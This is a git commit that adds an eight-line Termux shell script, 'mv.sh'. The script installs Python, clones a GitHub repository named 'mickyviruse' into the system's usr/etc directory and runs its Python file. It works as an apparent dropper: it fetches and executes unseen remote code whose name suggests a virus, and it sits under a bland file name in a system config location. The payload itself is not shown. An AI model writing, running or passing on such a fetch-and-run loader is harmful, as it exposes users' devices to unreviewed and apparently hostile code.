0c7edf0b7db1b5bb9895baf4fbe3aeeadec80fe5
uknownash <47666850+uknownash@users.noreply.github.com>
2020-01-14 08:59:03 +0530

    Add files via upload

---
+++ mv.sh
@@ -0,0 +1,8 @@
+clear
+cd /data/data/com.termux/files/home
+pkg install python
+cd /data/data/com.termux/files/usr/etc
+git clone https://github.com/uknownash/mickyviruse.git
+cd mickyviruse
+python mickyviruse.py
+pwd
